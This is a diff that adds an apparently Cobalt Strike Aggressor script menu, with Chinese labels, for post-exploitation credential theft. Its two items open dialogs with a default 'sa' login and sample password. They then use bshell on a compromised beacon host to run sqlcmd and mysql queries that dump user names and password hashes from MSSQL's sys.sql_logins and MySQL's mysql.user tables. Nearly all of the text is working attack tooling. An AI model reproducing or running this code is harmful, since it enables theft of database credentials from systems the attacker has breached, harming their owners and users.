@@ -1,0 +1,40 @@
+    	menu "Dump数据库hash"{
+    			item "Dump Mssqlhash"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("获取数据库用户和hash",%(username => "sa",passsword => "admin1230.",host => "127.0.0.1",bid => $bid),&Dump_mssqlhash);
+                    drow_text($Dialog, "username", "数据库用户名: ");
+                    drow_text($Dialog, "passsword", "数据库密码: ");
+                    drow_text($Dialog, "host", "目标主机: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+                sub Dump_mssqlhash{
+    				local('$Name');
+    				$Name = $3['username'];
+    				$Pwd = $3['passsword'];
+                    $host = $3['host'];
+    				bshell($bid, "sqlcmd -U $Name -P  $Pwd   -S $host -d master -Q \" SELECT name, password_hash FROM master.sys.sql_logins;\" ");
+			
+
+				}
+
+
+					item "Dump Mysqlhash"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("获取数据库用户和hash",%(username => "sa",passsword => "admin1230.",host => "127.0.0.1",bid => $bid),&Dump_mysqlhash);
+                    drow_text($Dialog, "username", "数据库用户名: ");
+                    drow_text($Dialog, "passsword", "数据库密码: ");
+                    drow_text($Dialog, "host", "目标主机: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+                sub Dump_mysqlhash{
+                    local('$Name');
+                    $Name = $3['username'];
+                    $Pwd = $3['passsword'];
+                    $host = $3['host'];
+                    bshell($bid, "mysql -u $Name  -p  $Pwd -D Mysql -e \"select user,host,password from mysql.user\\G;select version()\\G;\"; ");
+				}
+	
+
+	}
